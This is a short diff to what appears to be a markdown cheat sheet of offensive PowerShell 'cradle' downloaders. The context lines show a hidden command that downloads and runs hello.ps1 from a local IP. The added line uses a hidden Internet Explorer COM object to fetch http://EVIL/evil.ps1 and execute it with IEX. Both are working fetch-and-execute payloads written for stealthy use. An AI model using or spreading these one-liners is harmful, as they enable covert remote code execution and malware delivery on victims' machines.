@@ -2093,6 +2093,8 @@ This section contains onelinner crandle downloaders that for one reason or anoth
 
       powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
       
+      $ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+      
 ![rf](https://user-images.githubusercontent.com/23490060/94825488-29098b80-03fe-11eb-8ea9-1caca3ab7b4e.png)
 
 <br /><br />
